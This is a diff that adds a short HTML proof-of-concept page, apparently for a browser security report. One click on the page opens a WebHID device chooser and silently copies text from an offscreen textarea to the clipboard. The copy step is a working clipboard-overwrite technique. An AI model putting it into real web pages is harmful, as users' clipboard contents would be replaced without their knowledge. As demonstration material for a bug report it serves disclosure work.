@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+      body {
+        width: 100%;
+        height: 100%;
+      }
+    </style>
+    <script>
+    async function poc() {
+      let [device] = await navigator.hid.requestDevice({ filters : [] });
+      console.log(`Device with name "${device.productName}" is now accessible.`);
+      let copyText = document.querySelector("#input");
+      copyText.select();
+      document.execCommand("copy");
+    }
+    </script>
+  </head>
+  <body onclick="poc()">
+  <p>
+    This is a full-screen body. Click anywhere to demonstrate WebHID and clipboard. Just select any device, it will not be accessed.
+  </p>
+  <textarea id="input" type="text" style="position: absolute; left: -200vw;">Your clipboard was changed :)</textarea>
+  </body>
+</html>
